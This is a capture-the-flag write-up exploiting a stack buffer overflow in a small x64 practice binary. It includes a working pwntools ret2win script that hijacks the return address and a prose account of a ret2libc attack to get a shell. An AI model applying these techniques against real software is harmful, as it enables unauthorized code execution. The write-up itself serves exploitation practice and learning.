<h3> Binary Exploitation </h3>

#### This is a binary a friend of mine gave me and i decided to do it and it turns out pretty easy

#### Basic File Checks
![image](https://user-images.githubusercontent.com/127159644/227796080-4c7a83aa-bfbd-4e3f-8bc4-e9822a3f1219.png)

We can see its a x64 binary and the only protection enabled is `NX enabled`

I'll run the binary to know what it does

```
➜  ~ ./chall 
I ask you what your heart desire ? 
lol
I hear the secrets that you keep ! 
yea
➜  ~ 
```

Nothing really much happening here

So using ghidra i'll decompile the binary
![image](https://user-images.githubusercontent.com/127159644/227796173-66383c20-474c-4287-82c4-f03d817e7f78.png)

There's also a flag function in it but the flag is redacted
![image](https://user-images.githubusercontent.com/127159644/227796226-19541dc4-1ea3-4bc1-ae3d-c5bb3126b0a1.png)

So for this the task was 2 the first one was to get the flag while the second was to get shell

Getting the flag is basically just going to have to do with ret2win

Here's the main function

```
undefined8 main(void)

{
  undefined buf [24];
  void *local_10;
  
  disable_buffering();
  local_10 = mmap((void *)0x1337000,0x1000,7,0x22,0,0);
  puts("I ask you what your heart desire ? ");
  read(0,local_10,128);
  puts("I hear the secrets that you keep ! ");
  read(0,buf,128);
  return 0;
}
```

Looking at it since it doesn't do much we can spot the vulnerability already

```
read(0,buf,128);
```

It's reading 128 bytes into a buffer that can only hold up 24 bytes so this is a buffer overflow

Lets now perform the exploitation

#### Ret2Win Exploitation

First we need the offset needed to hijack the rip register
![image](https://user-images.githubusercontent.com/127159644/227796422-e7968080-3ae3-4bcc-943b-1effad48a96b.png)
![image](https://user-images.githubusercontent.com/127159644/227796452-5e6fb05a-e02f-449a-921a-bcccf7c010c9.png)

So the offset is `40` with this performing the ret2win should be straight forward

We just need the adderss of the flag function which can be gotten from gdb or ghidra
![image](https://user-images.githubusercontent.com/127159644/227796531-748320a3-0b21-45e1-a582-268c35e16423.png)

Now here's the solve script for performing the ret2win

```
from pwn import *
import warnings

io = process('./chall')
warnings.filterwarnings('ignore')

offset = 40
padding = b'B'*offset
addr = p64(0x00000000004011fb)

payload = padding + addr

io.send('lol')
io.sendline(payload)
#io.interactive()
io.recvline()
io.recvline()
flag = io.recvline()
success(flag)
```

Running it works
![image](https://user-images.githubusercontent.com/127159644/227796637-a2954788-2a4d-4606-832d-1930ec1736fb.png)

Now for the second part of the challenge which is getting shell here's what i did

I just performed a ret2libc

Why i did that was because during the program execution the global offset table of puts is already populated
![image](https://user-images.githubusercontent.com/127159644/227796788-4ec19eae-2ec5-4270-8a2c-867a12423f64.png)
![image](https://user-images.githubusercontent.com/127159644/227796802-3606b946-5b94-4b06-b63e-8e2cee7ccc00.png)
![image](https://user-images.githubusercontent.com/127159644/227796813-d73bb565-1b40-4140-b827-49a15fa2b491.png)

Here's my solve script [Exploit]()

Running it works
![image](https://user-images.githubusercontent.com/127159644/227796869-69662796-a767-4418-9d59-9efd1121fcde.png)
